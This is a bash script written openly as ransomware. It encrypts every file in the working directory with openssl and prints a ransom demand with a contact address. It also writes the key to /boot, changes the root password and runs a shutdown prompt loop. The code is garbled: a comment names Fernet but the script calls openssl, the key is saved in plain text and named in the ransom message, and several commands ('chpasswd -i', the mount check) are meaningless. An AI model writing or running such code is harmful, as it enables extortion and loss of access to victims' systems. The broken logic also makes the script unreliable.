#!/bin/bash

# Check if the system is 64-bit
if [ $(getconf LONG_BIT) -ne 64 ]; then
    echo "This script can only run on 64-bit systems."
    exit 1
fi

# Check if the user has permission to write to the boot sector
if ! sudo mount | grep /dev/sda1; then
    echo "You do not have permission to write to the boot sector."
    exit 1
fi

# Get the current working directory and create a backup
CWD=$(pwd)
mkdir ${CWD}_backup
cp -R * ${CWD}_backup/

# Encrypt the files using Fernet
key=$(openssl rand -base64 32)
iv=$(openssl rand -hex 16)

echo "Key: $key" >> ${CWD}_settings.txt
echo "IV: $iv" >> ${CWD}_settings.txt

for file in *; do
    if [ -f "$file" ]; then
        openssl enc -aes-256-cbc -md sha256 -pass pass:$key -in "$file" -out "${file}.enc" -iv "$iv"
    fi
done

# Display a ransomware message
echo "Your files are encrypted."
echo "To decrypt, contact us at example@example.com for the key."
echo "If you want to decrypt without contacting us, look in ${CWD}_settings.txt."

# Set the system to require a password on boot
sudo echo "$key" | sudo tee /boot/passwd
sudo echo "$iv" | sudo tee /boot/key
sudo chpasswd -i

# Change the boot loader password
sudo passwd root

# Make sure the system does not shut down or restart
while true; do
    read -p "Do you want to shut down the system? (y/n): " input
    if [ "$input" == "n" ]; then
        while true; do
            read -p "Are you sure you don't want to restart the system? (y/n): " input
            if [ "$input" == "n" ]; then
                break
            fi
        done
    elif [ "$input" == "y" ]; then
        shutdown -r now
    else
        echo "Invalid input."
    fi
done
